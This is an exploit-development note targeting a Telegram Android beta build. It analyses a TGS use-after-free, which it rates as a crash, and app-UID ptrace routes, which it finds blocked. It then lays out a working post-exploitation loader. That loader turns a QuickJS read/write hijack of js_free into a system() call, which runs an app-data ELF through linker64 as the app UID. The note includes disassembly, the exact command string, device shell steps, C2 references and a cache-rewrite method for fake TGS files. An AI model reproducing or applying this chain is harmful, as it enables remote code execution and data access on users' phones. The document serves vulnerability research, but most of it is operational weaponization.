# Loader from the Telegram app context — TGS UAF + leak vs app-UID injection

Date: 2026-11-02. Host/lab only (no phone, no emulator, no VM); the Sony plan
in §5 is for the caller. Companion to `notes/tgs_uaf_weaponization.md` and
`notes/regexp1827_class64_v3_device_fix.md`; this note does not modify the main
report.

Target: `org.telegram.messenger.beta` 13.2.0 beta (72799), arm64,
`lib/arm64-v8a/libtmessages.49.so` 27,016,000 B, md5
`2c0caa68a07fc26f79d13519af6c3526`, BuildId
`645cce3998197329915f6cbfcc9ffd7f124d9f86`; Sony XQ-BT52, Android 13, UID
10357, context `u:r:untrusted_app:s0:c101,c257,c512,c768`.

Lab: `lab/loader_tgs_native/` (host models, the native payload, the device
probe, logs, exact evidence). Status legend: **CONFIRMED** = binary/source or
executed on the host; **DEVICE-PENDING** = a device measurement is planned;
**HYPOTHESIS** = not measured.

---

## 0. Verdict

| Question | Answer |
|---|---|
| Route 1: TGS UAF + first-exploit leak → native loader | **No.** The UAF's `+1` is not a write primitive: it is an `Arc::clone` paired with the clone's drop at the end of the same `render()` call. It survives only if the process dies before the drop (a crash). The arbitrary target (`comp`) must also be the `Composition` the renderer walks, and a fake composition that survives cannot be an arbitrary address. GOT/RELRO is read-only and a writable code pointer `+1` is a misaligned pointer, not a redirect. The race sub-window for the `comp` read is the JNI prologue (~µs), not the 14 ms render. The reclaim of the freed 1648-byte block with attacker bytes must also happen inside that window. **The UAF is a crash/DoS with a post-mortem increment, not a loader.** |
| Route 1: can the leak be combined at all? | Only **same-process and after the first exploit has run**: open the widget chat (QJS arbitrary read → libc/libtmessages bases), return to the dialog list, rewrite the cached `.tgs` with an address-dependent fake instance, trigger a rebind. This chain still dies on the transient increment and the window; it is not a cold-start loader, because ASLR is per process and the TGS path leaks nothing. |
| Route 2: app-UID shell `ptrace`/`process_vm_writev` into the app | **No on the retail app** (source-confirmed; the §5.3 probe is DEVICE-PENDING). The app is **non-dumpable**: zygote's `setresuid()` resets `mm->dumpable` to `/proc/sys/fs/suid_dumpable` (0 on Android), and `ptrace_may_access()` then denies *every* attach/read mode to a same-UID, no-CAP_SYS_PTRACE tracer — `PTRACE_ATTACH`, `process_vm_readv/writev`, `/proc/<pid>/mem`, and `/proc/<pid>/maps` all fail with `EPERM`. SELinux actually allows same-domain `ptrace` (`allow untrusted_app_all self:process ptrace`, type-based), and AOSP `init.rc` does not set Yama; the kernel `dumpable` check is the decisive gate (Yama's kernel default is 1 = descendants only, a second blocker for a child→parent attach). |
| Route 2: if it were allowed, would it give a startup loader? | **No.** An in-memory `dlopen` injection is gone at the next process start. The app-data `.so` survives, but nothing loads it at startup. It is also strictly more work than the route below. |
| What *does* work | **An app-UID native loader on demand** (policy-confirmed; device test §5.2), using the first exploit's existing one-call primitive: `system("cd /data/data/<pkg>/files && /system/bin/linker64 /data/data/<pkg>/files/loader_proof.so")`. Policy: `untrusted_app_all system_linker_exec:file execute_no_trans`, `app_data_file:file { r_file_perms execute }`; `linker64 <path>` opens argv[1] with **no namespace check** and runs the ELF's `DT_INIT`/`INIT_ARRAY`. No ptrace, no UAF, no `System.load` gate. A second candidate is `app_process` + a dex from app data; `System.load` there is namespace-dependent and device-pending. |
| Persistence at next startup/update | **None from the loader itself.** The loader is a process, not a hook; it dies with the app cgroup. The app-data artifact survives an update, and the widget message re-runs the first exploit when the chat is rendered (the existing re-deployable seed). The `ks` `libtmessages.49loc.so` fallback and the forged ART app image remain the only evaluated app-data startup paths, and their gates are unchanged. |

**Bottom line: the TGS UAF is not a step toward a loader; the loader is a
one-line consequence of the first exploit, and it is a new app-UID process, not
an injection or a startup hook.**

---

## 1. What the first exploit already provides (binary facts)

The #1827 class-64 chain (`notes/regexp1827_class64_v3_device_fix.md`) gives an
arbitrary 8-byte read/write over the QuickJS victim `ArrayBuffer` and a
**one-call primitive**:

```
libtmessages.49.so 72799, sub_16FED7C = js_free_rt:
  16FEE8C  LDR  X8, [X0,#0x40]     ; rt->malloc_state.opaque   (rt+64)
  16FEE90  LDR  X2, [X0,#0x10]     ; rt->mf.js_free             (rt+16)
  16FEE94  MOV  X0, X8             ; x0 = opaque  (attacker-controlled)
  16FEE98  MOV  X1, X19            ; x1 = ptr     (a heap pointer)
  16FEEA8  BR   X2
```

`sub_173E36C` (the default `js_free`) is `MOV X0, X1; B free` — the table entry
is the 1-argument wrapper, so replacing `rt+16` with `system` and writing the
command address to `rt+64` calls `system(cmd)`. This is exactly the device
chain; the decompiler view of the same call is
`return (*(...)(result+16))(*(result+64), v2)`.

Consequences for a loader:

* `system(cmd)` is a **one-argument** call with a fully controlled `x0`. It is
  the natural loader primitive: it can exec `/system/bin/sh`, which can exec
  `/system/bin/linker64` (see §4).
* `dlopen(path, flags)` would receive `x1 = ptr` (a heap pointer) as `flags`.
  bionic validates the flag mask (`linker.cpp:2087`: `flags &
  ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL|RTLD_NODELETE|RTLD_NOLOAD)` must
  be 0), so that call fails. The `js_malloc` hook (`x1 = size`, `x0 = opaque`)
  is the only two-argument shape that can pass `flags = 1/2`; it is not needed
  for the loader and was not validated here.
* The leak (`JS_DEF_FREE` → PIE base, `free@GOT` → libc, the universal ELF
  resolver) is in-process and per process. It is a *leak*, not a loader, and it
  is not available at cold start before the widget JS runs.

---

## 2. Route 1: what the TGS UAF can and cannot do

### 2.1 The renderer's use of the reclaimed object (72799 + source)

`CPURenderer::render` (source `src/renderer/cpu/renderer.rs:102`; binary
`sub_105D28C`, offsets from `lab/tgs_uaf_weaponization/evidence/`):

```
LDRB  W8, [X1,#0x50B]      ; model_validated: non-zero skips validate_model
LDR   X8, [X19,#0x4F0]     ; comp: Arc<Composition> — attacker bytes after reclaim
LDRB  W9, [X8,#0x58]       ; Composition::is_static — a read through comp
LDXR/STXR [X8]             ; Arc::clone: *(u64*)comp += 1
memcpy(dst, X19, 0x260)    ; core::mem::take(&mut self.walker)
memcpy(X19, default,0x260) ; write Default back into the object
... render with the copied walker and the composition ...
```

The source shows the matching drop:

```rust
let composition = alloc::sync::Arc::clone(&self.comp);   // +1
let mut walker = core::mem::take(&mut self.walker);
let result = self.with_bitmap(..., |r| walker.render_validated(&composition, ...));
self.walker = walker;
...
result                                                   // composition dropped here: -1
```

The `static_bitmap` fast path returns *before* the clone
(`renderer.rs:108-121`), so a fake that takes it does not increment at all.

### 2.2 The increment is paired — measured

`lab/loader_tgs_native/src/uaf_fake_render.cpp` builds a fake instance in a
controlled buffer (not via the allocator; the post-reclaim state is taken as
given) and calls the real `tlottie_render_with_options`:

| mode | setup | result (host, `logs/fake_render.txt`) |
|---|---|---|
| `balance` | a real instance, normal render | `rc=0`, composition refcount `1 → 1`, **net 0** |
| `arbitrary` | fake `comp` = mapped zero page, `model_validated=1` | `rc=0`, counter `0 → 0`, **net 0**; the render *succeeds* (an empty composition) |
| `repeat` | the same fake, 200 consecutive calls | `200/200 rc=0`, final counter `0` |
| `arbitrary-ro` | fake `comp` = `PROT_READ` page | `SIGSEGV`, `si_code=2` (`SEGV_ACCERR`), fault address **= the chosen page**: the `Arc::clone` `STXR` really executed at the attacker's target |
| `validcomp` | fake `comp` = a real `Arc<Composition>`, zero walker | `SIGSEGV`; refcount `1 → 2` — the `+1` survives **only because the process died before the drop** |

So the primitive is a **transient `+1/-1`**: it is observable (the read-only
page proves the store instruction reaches the attacker's address), but it is
reverted by the clone's drop on every render that returns. The only way to keep
the `+1` is to not return — i.e. to crash. A post-mortem `+1` cannot corrupt a
live process' state.

This is the correction to the weaponization note's "arbitrary increment"
framing: the primitive is real, but it is not a write primitive and it is not
usable for a hijack. The same applies to a `+1` on a length or a refcount: a
length that is `+1` during the render and `-1` at the end has no lasting
effect.

### 2.3 The target and the survivable composition are mutually exclusive

`comp` is used twice: as the `Arc` to clone/increment and as the
`Composition` the renderer walks. For the render to return, `comp` must be a
valid (or at least benign, e.g. empty) composition; then the clone is dropped
and the increment is undone. For the increment to hit an arbitrary address, the
same address must be treated as a composition; a zero page is a benign *empty*
composition (that is why `arbitrary` returns 0), but a page with useful
contents for one target is not a valid composition. A real `Arc<Composition>` +
a zero walker crashes in the walker (the `validcomp` run); a copy of a real
walker would need the walker bytes, which are not leaked.

The only construction that keeps a `+1` on a live process would be a
non-returning render (an unbounded loop) whose `comp` is simultaneously an
arbitrary target — contradictory, because the loop needs a valid composition
and the target would then be that composition.

### 2.4 No function-pointer/GOT hijack is reachable

* **GOT is read-only.** The ELF is linked `BIND_NOW` and full RELRO:
  `.got` `0x1959778..0x1964bd0`, `.got.plt` `0x1964bd0..0x19658b8`,
  `.relro_padding` to `0x19658b8`; `free@GOT = 0x1964cc0` is inside RELRO.
  A `+1` store to a GOT entry faults (SEGV_ACCERR), it does not redirect.
* **Writable code pointers exist, but `+1` cannot redirect them.** `.data`
  (`0x19698c0..0x19cb1e8`) has **2,063** `R_AARCH64_RELATIVE` relocations whose
  addend is a `.text` address (e.g. the tgnet JNI table at `0x1969970`). A
  `+1` makes the pointer odd → an instruction-fetch alignment fault, not a
  valid alternate entry. Redirecting needs a full 8-byte write, which the
  primitive does not provide.
* **No function pointer in the object.** `CPURenderer` is a concrete Rust
  struct; `FrameRenderer` is a generic (static dispatch). There is no vtable in
  the reclaimed bytes to overwrite. PAC/arm64e is therefore irrelevant: there
  is nothing to sign or redirect. (The Sony is an ARMv8.2-class SoC with no MTE (the prior note measured that); user-space PAC is not used by Android 13;
  the app lib is NDK r27c with no PAC/BTI GNU property note.)

### 2.5 The race sub-window is the JNI prologue, not the render

The prior note's 81 % is "destroy while the executor is inside
`tlottie_render_with_options`" — the **crash** path. The `comp` read is in the
first instructions of that call, so the increment path needs the destroy to
land between the Java handle load (`long p = this.b`) and the render prologue.
That window is the JNI transition + `nGetFrame` (`MOV X0,X2; B
tlottie_render_with_options`, 8 bytes) + `Trace.beginSection` — **~1-5 µs**,
not 14 ms.

`lab/loader_tgs_native/src/race_window_model.cpp` adds a pre-render counter to
the existing lifecycle model (`--slow-native-us` is the injected pre-render
window, exactly that window):

| injected pre-render window | destroy-while-render (hits) | of which **free before render entry** |
|---|---|---|
| 10 µs | 50/60 (83.3 %) | **0** |
| 100 µs | 49/60 (81.7 %) | **0** |
| 1,000 µs | 52/60 (86.7 %) | 3/60 = 5.0 % of trials, 5.8 % of hits |
| 5,000 µs | 55/60 (91.7 %) | 17/60 = 28.3 % of trials, 30.9 % of hits |

The pre-render fraction scales as `S / 16.7 ms` (one 60 fps period): the
prediction is 6 % at 1 ms and 30 % at 5 ms; the measured rows are 5.0 % and
28.3 % (60 trials each; the 60-trial binomial spread is several points). For the real JNI window
(1-5 µs) that is **~0.006-0.03 % per detach** (1 in ~3,300 to ~16,700), and
this is before the reclaim. The 83-92 % rows are the crash; they do not measure the increment path.

### 2.6 The reclaim window and the content source

The freed `TLottieInstance` is a 1296-byte object in a `malloc(0x528)` = 1320
byte block → Android Scudo class **0x670 (1648 B)**. The class request range is
`(1104-16, 1648-16] = 1089..1632`.

Attacker bytes in that class come from `lottie.cpp readFile()`:
`gzread` into a `std::string` (16 KiB chunks), handed to
`tlottie_new_with_options`, destroyed when `nCreate` returns. For a
~1.3-1.6 KB decompressed payload the string is live for the **JSON parse**
(microseconds for an invalid binary payload; tens of µs for a valid 1.5 KB
Lottie). The string starts at the block base; the stale handle is
`block + 0x10`, so the fake fields are at string offsets
`0x10 + 0x4F0 = 0x500` (`comp`) and `0x10 + 0x50B = 0x51B`
(`model_validated`) — the generator in
`lab/loader_tgs_native/src/gen_fake_tgs.py` uses exactly these.

The problems compound:

1. The block enters the Scudo quarantine on `tlottie_drop`. With the documented
   256/64/2048 configuration the next reclaim needed **217** same-class
   allocations (prior lab); with quarantine 0 the next same-class allocation
   can take it.
2. The reclaim allocation must happen **after the free and before the render
   reads `comp`** — the same ~µs pre-render window. The quarantine makes a
   reclaim in that window impossible; with quarantine 0 the attacker still
   needs a same-class allocation on another thread in that window.
3. The string's *content* is binary and not valid JSON; `tlottie_new` fails
   fast, but the allocation and bytes remain until the block is reused. The
   bytes persisting after the free does **not** help the `comp` path: the
   stale render is already in flight when the free happens.
4. Inside the TGS path, the only long-lived same-class allocation is another
   *live* `TLottieInstance` (a valid `CPURenderer`) — the type-confusion
   variant, not attacker bytes (see the widget-buffer correction below).
5. **The wider-window UAF is the `Rasterizer` write, not the increment.** The
   ASan report (`logs/lifecycle_asan_write.log` in the weaponization lab) is a
   104-byte `memcpy` into a freed 416-byte scratch `Vec` buffer at
   `RenderScratch::put_raster` — the free is during the render (the 81 % window)
   and the write happens later in the same render. That window is much wider
   than the `comp` read, but the written bytes are renderer-internal
   (`Rasterizer` fields: heap pointers and TGS path coordinates), not
   attacker-chosen 8-byte values, and the 416-byte class has no demonstrated
   function pointer. It is a corruption primitive with a controlled *size* and
   a semi-controlled *content*, not a controlled pointer, and no loader was
   derived from it.

**A correction to "the attacker cannot allocate natively".** The widget engine
is full quickjs-ng, so `new ArrayBuffer(1500)` / `new Uint8Array(1500)` is a
native allocation through the app's `mf.js_malloc` (→ `malloc`, i.e. Scudo),
and the script can fill it byte-by-byte with the fake instance. A 1500-byte
request is class 0x670 — the same class as the freed `TLottieInstance`. So an
exact, live attacker-content source *exists* in principle (the 6 MiB JS heap
allows thousands of 1500-byte buffers). The open questions are lifetime and timing: the
dialog list is not drawn while the widget chat is visible, and whether a widget
session (and its `ArrayBuffer` globals) survives the return to the list was not
established. If it does, the spray removes the *content* problem only; the
`+1` is still transient and the free must still precede the `comp` read by a
few µs. This is worth a device measurement before treating the TGS string as
the only content source.

The TGS file is static: an address-dependent fake instance (a leaked libc/heap
address at `0x500`) cannot be uploaded ahead of time. The first exploit's shell
can rewrite the cached `.tgs` (app data) after leaking, but the app must then
re-read the file and re-create the animation, and the whole chain remains
same-process and window-bound. Two delivery caveats: (a) the *remote* path is
limited to what the sticker upload accepts — the server-side TGS validation was
not tested here, and a bot cannot ship arbitrary binary bytes as a valid TGS;
(b) the *local* rewrite must survive the app's document-cache consistency
checks (size/hash) or the client re-downloads the original; the device plan is
a lab/local technique, not a proven remote primitive. **No cold-start, no
cross-process leak.**

### 2.7 The arbitrary-free side effect

The render error path does `self.state = Default::default()` and
`self.walker = Default::default()`, dropping attacker-derived `Vec`s. A crafted
fake `RenderScratch` with a valid aligned chunk pointer *could* make the
renderer free a chosen live chunk; whether the render then returns `Err` with
the process alive depends on the rest of the drop and was not demonstrated. This is the only *persistent* memory primitive in the object, and it
has the same reachability gate as §2.6 (the fake must be in the stale block in
the pre-render window). The prior lab's Scudo run stopped at "misaligned
pointer when deallocating"; freeing a *valid* target was not demonstrated, and
it is strictly weaker than the first exploit's existing arbitrary R/W. Not
pursued.

### 2.8 Route 1 verdict

**The UAF cannot be turned into a loader.** The blockers are independent:
(a) the `+1` is reverted unless the process dies; (b) a survivable render
cannot use an arbitrary `comp`; (c) the GOT is read-only and `+1` on a writable
code pointer is a misalignment; (d) the increment window is the JNI prologue
(~1e-4 per detach), and the reclaim must fit in the same window, after a
quarantine of ~217 chunks. The realistic classification stays
**remote race-dependent crash/DoS**, with a *post-mortem* increment.

---

## 3. Route 2: app-UID process injection

### 3.1 The shell's identity

`system()` / `Runtime.exec` fork the app and `execve("/system/bin/sh")`.
`allow { appdomain -ephemeral_app -sdk_sandbox } shell_exec:file rx_file_perms`
(`private/app.te:128`) grants `execute`, `execute_no_trans` and `map`
(`rx_file_perms` = `r_file_perms + x_file_perms`; `x_file_perms` includes
`execute_no_trans`). There is no `type_transition appdomain shell_exec:process
shell`, so the child **stays in the app's SELinux domain** with the app's UID
and MLS categories. Device evidence: the C2 `exec id` returns
`uid=10357(u0_a357) context=u:r:untrusted_app:s0:c101,c257,c512,c768`.

### 3.2 The decisive gate: `mm->dumpable == 0`

`Zygote.cpp` (android13) does `setresuid(uid,uid,uid)` and then:

```
1655  // The "dumpable" flag ... is overwritten by /proc/sys/fs/suid_dumpable
1663  int dumpable = prctl(PR_GET_DUMPABLE);
1669  if (dumpable == 2 && uid >= AID_APP) prctl(PR_SET_DUMPABLE, 0);
```

The comment states the normal case: `suid_dumpable` is **0**, so zygote
children are non-dumpable. `EnableDebugger()` (dumpable=1 +
`PR_SET_PTRACER_ANY`) runs only for JDWP (`Zygote.cpp:596-606`); the retail
Telegram process is not debuggable and does not call it. The app's own native
code does not undo this either: `libtmessages.49.so` imports `prctl` at four
sites, all `PR_SET_NAME`/`PR_GET_NAME` (options 15/16) — there is **no**
`PR_SET_DUMPABLE` (4) or `PR_SET_PTRACER` (`0x59616d61`) constant anywhere in
the 27 MB lib (IDA xrefs + a byte search of the file).

In the kernel, `ptrace_may_access()` denies **all** modes (attach, read,
`process_vm_readv/writev`, `/proc/<pid>/mem`, `/proc/<pid>/maps`) when the
target's `mm->dumpable != SUID_DUMP_USER` and the tracer lacks
`CAP_SYS_PTRACE`. The shell is same-UID but has no capability → **EPERM before
SELinux or Yama is consulted**. `/proc/<pid>/stat` and `status` stay readable
(which is why `ps` works); they carry no addresses.

Consequences:

* `ptrace(PTRACE_ATTACH)`, `PTRACE_SEIZE`, `process_vm_writev` and
  `/proc/<pid>/mem` on the Telegram process are all denied to the app-UID
  shell on the retail app.
* `/proc/<pid>/maps` is denied too, so the shell cannot leak libc/libtmessages
  addresses from the outside. The only leak is the in-app QuickJS read.
* A debuggable/JDWP-enabled build (`PR_SET_PTRACER_ANY`, dumpable=1) would
  re-open the route. The Pixel debug build in the report
  (`org.telegram.messenger.beta.dbg`) is the only candidate; the Sony retail
  build is not.

### 3.3 SELinux and Yama (secondary; both are not the blocker)

* **SELinux** allows same-domain cross-process ptrace:
  `allow untrusted_app_all self:process ptrace` (`untrusted_app_all.te:103`)
  is a *type-based* rule (`self` = the source type), so two distinct processes
  of the same domain match. The neverallows only restrict app→non-app and
  system→app (`public/app.te:66-81`). `process_vm_readv/writev` and
  `/proc/pid/mem` use the same `ptrace` permission.
* **Yama**: AOSP `init.rc` (android13) writes neither `ptrace_scope` nor
  `suid_dumpable`. The kernel default is **1** (`yama_lsm.c`:
  `static int ptrace_scope = YAMA_SCOPE_RELATIONAL`), created only when
  `CONFIG_SECURITY_YAMA=y`; scope 1 permits only descendants. The shell is a
  *descendant* of the app, so the ancestor rule does not help the shell attach
  the app; a debuggable app calls `PR_SET_PTRACER_ANY` to bypass it. Either
  way, §3.2 already denies the attach.

### 3.4 Even if the attach were allowed, it is not a startup loader

An in-memory injection (stop a thread, set PC/registers to a ROP chain that
calls `dlopen`) dies with the process. At the next start the app is a fresh
zygote child with a fresh ASLR layout; the injected bytes are gone. The
app-data `.so` survives but is not auto-loaded (the `ks` fallback needs the
normal load to fail; the ART image is the only evaluated startup path). So the
injection buys the same thing as §4 — native code in the app UID — with more
steps and more risk, and no persistence.

### 3.5 Route 2 verdict

**Retail app: blocked by the kernel `dumpable` check, not by SELinux/Yama.**
The device probe in §5 is expected to show `maps_read=-13`, `mem_open=-13`,
`ptrace_attach=-1`, `vm_readv=-1`. On a debuggable/JDWP build the numbers
would change; that build is not the target.

---

## 4. The loader that does work: `linker64 <app-data ELF>`

### 4.1 Policy

| Requirement | Source | Result |
|---|---|---|
| execve of `/system/bin/linker64` from an app | `untrusted_app_all system_linker_exec:file execute_no_trans` (`untrusted_app_all.te:32`); `file_contexts`: `/system/bin/linker(64)? → system_linker_exec` | allowed (no domain transition; `system_linker_exec` is not an `exec_type`) |
| map an app-data file with PROT_EXEC | `allow untrusted_app_all app_data_file:file { r_file_perms execute }` (`:27`); `allow { appdomain -isolated_app -sdk_sandbox } {... app_data_file ... }:file { getattr map read write }` (`app.te:256`) | allowed |
| execve a *binary* from app data | `neverallow { all_untrusted_apps -untrusted_app_25 -untrusted_app_27 -runas_app } { app_data_file privapp_data_file }:file execute_no_trans` (`app_neverallows.te:62-67`) | **denied** (the negative control) |
| `linker64` loads argv[1] from any absolute path | `load_executable()` → `open_executable()` → `open_library_at_path()` — `open()` + `ElfReader::Load`, **no `ns->is_accessible()` check** (`linker_main.cpp:272`, `linker.cpp:963-986`) | allowed |
| constructors run | `soinfo::call_constructors()` calls `DT_INIT` and `DT_INIT_ARRAY` (`linker_soinfo.cpp:516-553`) | allowed |
| `dlopen` from app data via the app classloader | `kAlwaysPermittedDirectories = "/data:/mnt/expand"` (`art/libnativeloader/library_namespaces.cpp:81,219`) | allowed *for the app classloader* |
| `LD_PRELOAD` from app data in a system executable | the default namespace's permitted paths come from `/linkerconfig/ld.config.txt` and do not include `/data`; `open_library` checks `is_accessible` (`linker.cpp:1189`) | **denied** (namespace; device-confirmed by §5.5) |

### 4.2 The payload

`lab/loader_tgs_native/src/loader_proof.c` is a raw-syscall ET_DYN:

* `.init_array` entry for `linker64 <file>`; `_start` for direct execution
  (host qemu sanity check);
* **no `DT_NEEDED`**, so the linker's default namespace has nothing to resolve;
* writes `loader_proof.txt` (relative to the CWD) with `uid`, `gid`, `pid`,
  `/proc/self/attr/current`, `cmdline`, the first `/proc/self/maps` line, then
  `exit_group`.

Host evidence (`logs/loader_elf.txt`, `logs/loader_host.txt`):
`Type: DYN`, `INIT_ARRAY` size 8, `BIND_NOW`, no `NEEDED`.
`/lib64/ld-linux-x86-64.so.2 ./loader_proof.so` (the host analogue of
`linker64 <path>`) runs the init_array and writes the proof; `qemu-aarch64
./loader_proof.so` runs the `_start` twin.

### 4.3 Device invocation (from the app-UID shell)

```sh
D=/data/data/org.telegram.messenger.beta/files
cd "$D"
/system/bin/linker64 "$D/loader_proof.so"
cat loader_proof.txt
```

Expected: `uid=10357`, `ctx=u:r:untrusted_app:s0:c101,c257,c512,c768`, and
`cmdline=.../loader_proof.so`; the process exits in the constructor. The
negative control is `./loader_proof.so` (direct execve) → `EACCES`.

From the QuickJS one-call primitive the same thing is one `system()` command:

```
cd /data/data/org.telegram.messenger.beta/files && /system/bin/linker64 /data/data/org.telegram.messenger.beta/files/loader_proof.so
```

The `cd` matters: the payload writes `loader_proof.txt` relative to its CWD,
and the app process' CWD is `/` (not writable).

The path must be **absolute**: `linker64` rejects a relative `argv[1]`
(`load_executable`: `if (orig_path[0] != '/') error`).

This is why the loader does not need the UAF: the first exploit's `system(cmd)`
is a one-argument call and `linker64` is exec'able by the app domain.

### 4.4 What the loader is and is not

* It is a **new process** with the app UID, the app domain, the app's data
  access and network; it is a native payload, not a library inside the
  Telegram process.
* It is **not** an injection, not a hook, and not persistent. It runs while
  the app is alive (the shell/child is in the app's UID cgroup); an app kill or
  update tears it down.
* For a *modular* native payload, the `loader_proof` pattern can be extended in
  two ways (both HYPOTHESIS, not tested): (a) a bionic-linked ET_DYN
  (`DT_NEEDED libc.so libdl.so`) creates its own namespace
  (`android_create_namespace(name, ..., permitted="/data", ...)`) and
  `android_dlopen_ext`s a second app-data `.so`; (b) the payload creates a
  `memfd`, writes the `.so`, and re-execs `sh` with
  `LD_PRELOAD=/proc/self/fd/N`: `open_library_at_path` skips the namespace
  `is_accessible()` check when the fd's filesystem is `TMPFS_MAGIC`
  (`linker.cpp:1189`), and a memfd is tmpfs. The self-contained payload is the
  verified-by-policy minimum.

### 4.5 `app_process` + dex + `System.load` (candidate)

`allow appdomain zygote_exec:file rx_file_perms` (`app.te:204`) lets the
app-UID shell exec `/system/bin/app_process` (no transition). A dex in app data
(e.g. `Loader.jar`, built with `d8`) can be run with
`CLASSPATH=$D/Loader.jar app_process /system/bin Loader $D/loader_proof.so`;
the class calls `System.load` on the app-data `.so`. SELinux permits the
`execute`; the open question is which classloader namespace performs the
`System.load` in an `app_process` VM (the boot/system loader may use the
default namespace, which does not permit `/data`, while the framework's app
loader gets `kAlwaysPermittedDirectories`). This is DEVICE-PENDING; it is not
needed for the loader.

---

## 5. Device test plan (Sony XQ-BT52, Android 13)

All app-side commands run in the app-UID shell (the C2 `exec` or an
`adb shell` that `run-as`-like enters the app; on the retail build `run-as`
does not work, so use the C2). Host-side observation uses the lab root
(Magisk) for tombstones.

### 5.0 Push the artifacts

```sh
# host
cd telegramandroidwidget/lab/loader_tgs_native
./device/host_push.sh            # adb push to /data/local/tmp
```

`untrusted_app` can read `/data/local/tmp` (`shell_data_file` read is allowed);
the app-side script copies the files into its own `files/` and chmods them.

### 5.1 Identity, Yama, dumpable

```sh
# device, app-UID shell
id
cat /proc/self/attr/current
cat /proc/sys/kernel/yama/ptrace_scope 2>&1
cat /proc/sys/fs/suid_dumpable 2>&1
getprop ro.build.type; getprop ro.build.version.release
```

Expected: `uid=10357`, `context=u:r:untrusted_app:s0:c101,c257,c512,c768`.
`yama_scope` may be absent (no CONFIG_SECURITY_YAMA) or 1 (the kernel default); `suid_dumpable` 0.
If `suid_dumpable` is 2 and the app was launched with JDWP, §3.2 changes — note
it and stop treating the app as retail.

### 5.2 Loader A (the main test)

```sh
# device, app-UID shell
PKG=org.telegram.messenger.beta; D=/data/data/$PKG/files
cp /data/local/tmp/loader_proof.so /data/local/tmp/device_probe.so \
   /data/local/tmp/Loader.jar "$D"/
chmod 700 "$D/loader_proof.so" "$D/device_probe.so"
cd "$D"

# negative control: direct execve of an app-data ELF must fail
./loader_proof.so;               echo "direct_rc=$?"

# loader: bionic linker, argv[1] must be an absolute path into app data
/system/bin/linker64 "$D/loader_proof.so"; echo "linker_rc=$?"
cat loader_proof.txt
```

Decision points:

| Observation | Meaning |
|---|---|
| `direct_rc=126/13`, `Permission denied` | expected: the `execute_no_trans` neverallow |
| `linker_rc=0`, `loader_proof.txt` with `uid=10357` + `ctx=u:r:untrusted_app...` | **native code execution as the app UID** (the loader works) |
| `CANNOT LINK EXECUTABLE` / `error: unable to open file` | check the path, `chmod 700`, and whether `/system/bin/linker64` is the APEX symlink |
| `error: ... not accessible for namespace` | should not happen for argv[1] (no namespace check); if it does, the loader binary differs from AOSP |

### 5.3 Route-2 gate probe

```sh
# device, app-UID shell; the app must be running; CWD = the app files dir
cd /data/data/org.telegram.messenger.beta/files
APP_PID=$(pidof org.telegram.messenger.beta | awk '{print $1}')
[ -z "$APP_PID" ] && APP_PID=$(ps -A -o PID,NAME | grep org.telegram.messenger.beta | grep -v grep | awk '{print $1}' | head -1)
echo "$APP_PID" > probe.cfg
/system/bin/linker64 "$D/device_probe.so"
cat probe.out
```

Expected on the retail Sony:

```
yama_scope=...            (1 or absent)
status=Uid: 10357 ...;TracerPid: 0;Seccomp: 2;
maps_read=-13             (EACCES: non-dumpable target)
mem_open=-13
ptrace_attach=-1          (EPERM)
ptrace_seize=-1
vm_readv=-1
```

If `maps_read > 0` / `ptrace_attach=0` / `vm_readv=8`, the app is dumpable
(JDWP/debuggable build, or a non-AOSP policy change): record it, and the
injection route is back on the table for that build only.

The probe attaches, waits, detaches and reads 8 bytes from the first mapped
page; it never writes to the app. If a test leaves the app stopped, `kill -9`
the probe (the kernel releases the trace when the tracer exits).

### 5.4 Loader B (`app_process` + `System.load`) — optional

```sh
# device, app-UID shell
cd /data/data/org.telegram.messenger.beta/files
CLASSPATH=$PWD/Loader.jar /system/bin/app_process /system/bin Loader \
  $PWD/loader_proof.so; echo "app_process_rc=$?"
cat loader_proof.txt
```

`LOADER_BEFORE` then either the proof (the `.so`'s init_array ran) or a
`dlopen`/namespace error. Record `app_process`'s stderr. This is the only
device test of `System.load` from app data; the `linker64` route does not
depend on it.

### 5.5 `LD_PRELOAD` — negative control

```sh
LD_PRELOAD=$PWD/loader_proof.so /system/bin/true; echo "rc=$?"
cat loader_proof.txt
```

Expected: the linker refuses the preload from `/data` (default-namespace
`is_accessible`), no proof. This distinguishes "SELinux allows the mapping"
(loader A) from "the default namespace permits the path" (it does not).

### 5.6 Route-1 UAF test (optional; expected crash/DoS)

This is a **lab/local** delivery (app-data rewrite), not a remote one: the
sticker upload path was not tested with binary fake TGS bytes, and the client
may re-download if the cache entry's size does not match the document.
Preparation (app-UID shell), with the victim heavy emoji already cached:

```sh
PKG=org.telegram.messenger.beta; D=/data/data/$PKG/files
# 1. find the cached TGS files (document cache)
find /data/data/$PKG -name '*.tgs' -o -name '*.tgs.*' 2>/dev/null | head
# 2. save the original, then write the fake instance
F=<one cached .tgs>
cp "$F" "$D/orig_$(basename $F)"
cp /data/local/tmp/fake_dead.tgs "$F"        # comp = 0xdead0000
```
(Generate the fake TGS on the host with
`./src/gen_fake_tgs.py --comp 0xdead0000`; the fields are at string offsets
`0x500`/`0x51b` for the 72799 layout.)

Trigger: open the chat list, scroll past the custom-emoji dialog so the cell
rebinds/starts/stops the animation; repeat 50-200 times (the emoji must be the
last-message content). Observe on the host (root):

```sh
adb logcat -c
adb shell 'ls -lt /data/tombstones | head'
adb shell 'su -c "cat /data/tombstones/tombstone_XX"' | grep -E "pid:|signal|Fault address|Abort message|backtrace" | head
adb logcat -b crash -d | tail -40
```

Decision points:

| Observation | Meaning |
|---|---|
| tombstone `signal 11`, fault in `libtmessages.49.so` near the TGS render, random address | the ordinary UAF crash (the prior result) |
| fault address = `0xdead0058` (or `0xdead0000` if a read/write is attempted) | **the fake instance was used**; the `comp` pointer was under attacker control (this is the only leak-free proof of the fake path) |
| no tombstone after 200 triggers, app alive | the reclaim never landed; record the trigger count and the Scudo config (`getprop`, `wrap.`) |
| `Fault address` = a valid libc/libtmessages address (with a real leak) | the fake was used with an address from the QJS leak; the increment still nets zero on a returning render (§2.2) |

**Widget-spray variant (only if the session survives).** Before relying on the
`ArrayBuffer` spray of §2.6, test the session lifetime: inject a widget script
that sets `globalThis.SPRAY = [ ... 2000 x Uint8Array(1500) ... ]` with a known
pattern, leave the chat, and re-open it; if `globalThis.SPRAY` is still there
(same context), the native buffers survived and the spray is a real source. If
the context is new (`NEW_CTX`), the buffers were freed on detach and the spray
cannot outlive the chat.

If the device uses the documented Scudo quarantine, a 200-trigger run is
